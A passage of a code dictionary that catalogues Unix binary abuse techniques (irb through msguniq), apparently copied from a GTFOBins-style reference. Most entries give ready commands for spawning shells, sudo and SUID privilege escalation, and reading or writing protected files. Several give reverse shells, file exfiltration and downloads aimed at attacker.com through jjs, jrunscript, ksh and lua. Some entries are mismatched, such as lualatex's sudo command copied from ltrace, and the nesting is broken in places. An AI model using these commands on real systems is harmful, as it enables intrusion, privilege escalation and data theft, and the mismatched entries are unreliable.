            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"irb\nFile.open(\"file_to_write\", \"w+\") { |f| f.write(\"DATA\") }"}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"irb\nputs File.read(\"file_to_read\")"}},
        'library_load':{
            'info':'It loads shared libraries that may be used to run code in the binary execution context.',
            'exploits':{
                '1':"irb\nrequire \"fiddle\"; Fiddle.dlopen(\"lib.so\")"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo irb\nexec '/bin/bash'"}},
            },
    'jjs':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | jjs"}},
        'reverse_shell':{
            'info':'It can send back a reverse shell to a listening attacker to open a remote network access.',
            'exploits':{
                '1':"export RHOST=attacker.com\nexport RPORT=12345\necho 'var host=Java.type(\"java.lang.System\").getenv(\"RHOST\");\nvar port=Java.type(\"java.lang.System\").getenv(\"RPORT\");\nvar ProcessBuilder = Java.type(\"java.lang.ProcessBuilder\");\nvar p=new ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start();\nvar Socket = Java.type(\"java.net.Socket\");\nvar s=new Socket(host,port);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(\"java.lang.Thread\").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs"}},
        'file_download':{
            'info':'It can download remote files.',
            'exploits':{
                '1':"export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\necho \"var URL = Java.type('java.net.URL');\nvar ws = new URL('$URL');\nvar Channels = Java.type('java.nio.channels.Channels');\nvar rbc = Channels.newChannel(ws.openStream());\nvar FileOutputStream = Java.type('java.io.FileOutputStream');\nvar fos = new FileOutputStream('$LFILE');\nfos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);\nfos.close();\nrbc.close();\" | jjs"}},
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"echo 'var FileWriter = Java.type(\"java.io.FileWriter\");\nvar fw=new FileWriter(\"./file_to_write\");\nfw.write(\"DATA\");\nfw.close();' | jjs"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which jjs) .\necho \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | ./jjs"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | sudo jjs'"}},
            },
    'join':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\njoin -a 2 /dev/null $LFILE"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which join) .\n\nLFILE=file_to_read\njoin -a 2 /dev/null $LFILE"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo join -a 2 /dev/null $LFILE"}},
            },
    'journalctl':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"journalctl\n!/bin/sh"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo journalctl\n!/bin/sh"}},
            },
    'jq':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\njq -Rr . \"$LFILE\""}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which jq) .\n\nLFILE=file_to_read\n./jq -Rr . \"$LFILE\""}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo jq -Rr . \"$LFILE\""}},
            },
    'jrunscript':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"jrunscript -e \"exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""}},
        'reverse_shell':{
            'info':'It can send back a reverse shell to a listening attacker to open a remote network access.',
            'exploits':{
                '1':"export RHOST=attacker.com\nexport RPORT=12345\njrunscript -e 'var host='\"'\"\"$RHOST\"\"'\"'; var port='\"$RPORT\"';\nvar p=new java.lang.ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start();\nvar s=new java.net.Socket(host,port);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){\nwhile(pi.available()>0)so.write(pi.read());\nwhile(pe.available()>0)so.write(pe.read());\nwhile(si.available()>0)po.write(si.read());\nso.flush();po.flush();\njava.lang.Thread.sleep(50);\ntry {p.exitValue();break;}catch (e){}};p.destroy();s.close();'"}},
        'file_download':{
            'info':'It can download remote files.',
            'exploits':{
                '1':"URL=http://attacker.com/file_to_get\nLFILE=file_to_save\njrunscript -e \"cp('$URL','$LFILE')\""}},
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"jrunscript -e 'var fw=new java.io.FileWriter(\"./file_to_write\"); fw.write(\"DATA\"); fw.close();'"}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"jrunscript -e 'br = new BufferedReader(new java.io.FileReader(\"file_to_read\")); while ((line = br.readLine()) != null) { print(line); }'"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which jrunscript) .\n\n./jrunscript -e \"exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\""}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo jrunscript -e \"exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""}},
            },
    'knife':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"knife exec -E 'exec \"/bin/sh\"'"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo knife exec -E 'exec \"/bin/sh\"'"}},
            },
    'ksh':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"ksh"}},
        'reverse_shell':{
            'info':'It can send back a reverse shell to a listening attacker to open a remote network access.',
            'exploits':{
                '1':"export RHOST=attacker.com\nexport RPORT=12345\nksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'"}},
        'file_upload':{
            'info':'It can exfiltrate files on the network.',
            'exploits':{
                '1':"export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nksh -c 'echo -e \"POST / HTTP/0.9\n\n$(cat $LFILE)\" > /dev/tcp/$RHOST/$RPORT'",
                '2':"export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'"}},
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"export LFILE=file_to_write\nksh -c 'echo DATA > $LFILE'"}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"export LFILE=file_to_read\nksh -c 'echo \"$(<$LFILE)\"'",
                '2':"export LFILE=file_to_read\nksh -c $'read -r -d \x04 < \"$LFILE\"; echo \"$REPLY\"'"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which ksh) .\n\n./ksh -p"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo ksh"}},
            },
    'ksshell':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nksshell -i $LFILE"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which ksshell) .\n\nLFILE=file_to_read\n./ksshell -i $LFILE"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo ksshell -i $LFILE"}},
            },
    'ld.so':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"/lib/ld.so /bin/sh"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which ld.so) .\n\n./ld.so /bin/sh -p"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo /lib/ld.so /bin/sh"}},
            },
    'ldconfig':{
        'sudo':{
            'info':'This allows to override one or more shared libraries. Beware though that it is easy to break target and other binaries.',
            'exploits':{
                '1':"TF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\nsudo ldconfig -f \"$TF/conf\""}},
        'limited_suid':{
            'info':'This allows to override one or more shared libraries. Beware though that it is easy to break target and other binaries.',
            'exploits':{
                '1':"sudo install -m =xs $(which ldconfig) .\n\nTF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\n./ldconfig -f \"$TF/conf\""}},
    'less':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"less /etc/profile\n!/bin/bash",
                '2':"VISUAL=\"/bin/sh -c '/bin/sh'\" less /etc/profile\nv"}},
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"echo DATA | less\nsfile_to_write\nq",
                '2':"less file_to_write\nv"}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"less file_to_read",
                '2':"less /etc/profile\n:e file_to_read"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which less) .\n\n./less file_to_read"}},
            },
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo less /etc/profile\n!/bin/sh"}},
            },
    'ln':{
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo ln -fs /bin/sh /bin/ln\nsudo ln"}},
            },
    'loginctl':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"loginctl user-status\n!/bin/sh"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo loginctl user-status\n!/bin/sh"}},
            },
    'logsave':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"logsave /dev/null /bin/sh -i"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which logsave) .\n\n./logsave /dev/null /bin/sh -i -p"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo logsave /dev/null /bin/sh -i"}},
            },
    'look':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nlook '' \"$LFILE\""}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which look) .\n\nLFILE=file_to_read\n./look '' \"$LFILE\""}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo look '' \"$LFILE\""}},
            },
    'ltrace':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"ltrace -b -L /bin/sh"}},
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_write\nltrace -s 999 -o $LFILE ltrace -F DATA"}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nltrace -F $LFILE /dev/null"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo ltrace -b -L /bin/sh"}},
            },
    'lua':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"lua -e 'os.execute(\"/bin/sh\")'"}},
        'no_interactive_reverse':{
            'info':'It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.',
            'exploits':{
                '1':"export RHOST=attacker.com\nexport RPORT=12345\nlua -e 'local s=require(\"socket\");\n\tlocal t=assert(s.tcp());\n\tt:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n\twhile true do\n\t\tlocal r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n\t\tlocal b=assert(f:read(\"*a\"));t:send(b);\n\tend;\n\tf:close();t:close();'"}},
        'no_interactive_bind':{
            'info':'It can bind a non-interactive shell to a local port to allow remote network access.',
            'exploits':{
                '1':"export LPORT=12345\nlua -e 'local k=require(\"socket\");\n\tlocal s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n\tlocal c=s:accept();\n\twhile true do\n\t\tlocal r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n\t\tlocal b=assert(f:read(\"*a\"));c:send(b);\n\tend;c:close();f:close();'"}},
        'file_upload':{
            'info':'It can exfiltrate files on the network.',
            'exploits':{
                '1':"RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nlua -e '\n\tlocal f=io.open(os.getenv(\"LFILE\"), 'rb')\n\tlocal d=f:read(\"*a\")\n\tio.close(f);\n\tlocal s=require(\"socket\");\n\tlocal t=assert(s.tcp());\n\tt:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n\tt:send(d);\n\tt:close();'"}},
        'file_download':{
            'info':'It can download remote files.',
            'exploits':{
                '1':"export LPORT=12345\nexport LFILE=file_to_save\nlua -e 'local k=require(\"socket\");\n\tlocal s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n\tlocal c=s:accept();\n\tlocal d,x=c:receive(\"*a\");\n\tc:close();\n\tlocal f=io.open(os.getenv(\"LFILE\"), \"wb\");\n\tf:write(d);\n\tio.close(f);'"}},
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"lua -e 'local f=io.open(\"file_to_write\", \"wb\"); f:write(\"DATA\"); io.close(f);'"}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which lua) .\n\nlua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo lua -e 'os.execute(\"/bin/sh\")'"}},
        'limited_suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which lua) .\n\n./lua -e 'os.execute(\"/bin/sh\")'"}},
            },
    'lualatex':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute(\"/bin/sh\")}\end{document}'"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo ltrace -b -L /bin/sh"}},
        'limited_suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which lualatex) .\n\n./lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute(\"/bin/sh\")}\end{document}'"}},
            },
    'luatex':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"luatex -shell-escape '\directlua{os.execute(\"/bin/sh\")}\end'"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo luatex -shell-escape '\directlua{os.execute(\"/bin/sh\")}\end'"}},
        'limited_suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which luatex) .\n\n./luatex -shell-escape '\directlua{os.execute(\"/bin/sh\")}\end'"}},
            },
    'lwp_download':{
        'file_download':{
            'info':'It can download remote files.',
            'exploits':{
                '1':"URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nlwp-download $URL $LFILE"}},
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\nlwp-download file://$TF $LFILE"}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nTF=$(mktemp)\nlwp-download \"file://$LFILE\" $TF\ncat $TF"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo lwp-download $URL $LFILE"}},
                },
    'lwp_request':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nlwp-request \"file://$LFILE\""}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo lwp-request \"file://$LFILE\""}},
            },
    'mail':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"mail --exec='!/bin/sh'",
                '2':"TF=$(mktemp)\necho \"From nobody@localhost $(date)\" > $TF\nmail -f $TF\n!/bin/sh"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo mail --exec='!/bin/sh'"}},
            },
    'make':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"COMMAND='/bin/sh'\nmake -s --eval=$'x:\n\t-'\"$COMMAND\""}},
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_write\nmake -s --eval=\"\$(file >$LFILE,DATA)\" ."}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which make) .\n\nCOMMAND='/bin/sh -p'\n./make -s --eval=$'x:\n\t-'\"$COMMAND\""}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"COMMAND='/bin/sh'\nsudo make -s --eval=$'x:\n\t-'\"$COMMAND\""}},
            },
    'man':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"man man\n!/bin/sh",
                '2':"man '-H/bin/sh #' man"}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"man file_to_read"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo man man\n!/bin/sh"}},
            },
    'mawk':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"mawk 'BEGIN {system(\"/bin/sh\")}'"}},
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_write\nmawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'"}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nmawk '//' \"$LFILE\""}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which mawk) .\n\nLFILE=file_to_read\n./mawk '//' \"$LFILE\""}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo mawk 'BEGIN {system(\"/bin/sh\")}'"}},
        'limited_suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which mawk) .\n\n./mawk 'BEGIN {system(\"/bin/sh\")}'"}},
            },
    'more':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"TERM= more /etc/profile\n!/bin/sh"}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"more file_to_read"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which more) .\n\n./more file_to_read"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"TERM= sudo more /etc/profile\n!/bin/sh"}},
            },
    'mount':{
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo mount -o bind /bin/sh /bin/mount\nsudo mount"}},
            },
    'msgattrib':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nmsgattrib -P $LFILE"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which msgattrib) .\n\nLFILE=file_to_read\n./msgattrib -P $LFILE"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo msgattrib -P $LFILE"}},
            },
    'msgcat':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nmsgcat -P $LFILE"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which msgcat) .\n\nLFILE=file_to_read\n./msgcat -P $LFILE"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo msgcat -P $LFILE"}},
            },
    'msgconv':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nmsgconv -P $LFILE"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which msgconv) .\n\nLFILE=file_to_read\n./msgconv -P $LFILE"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo msgconv -P $LFILE"}},
            },
    'msgfilter':{
        'shell':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'"}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nmsgfilter -P -i \"LFILE\" /bin/cat"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which msgfilter) .\n\necho x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'"}},
            },
    'msgmerge':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nmsgmerge -P $LFILE /dev/null"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which msgmerge) .\n\nLFILE=file_to_read\n./msgmerge -P $LFILE /dev/null"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo msgmerge -P $LFILE /dev/null"}},
            },
    'msguniq':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nmsguniq -P $LFILE"}},
        'suid':{
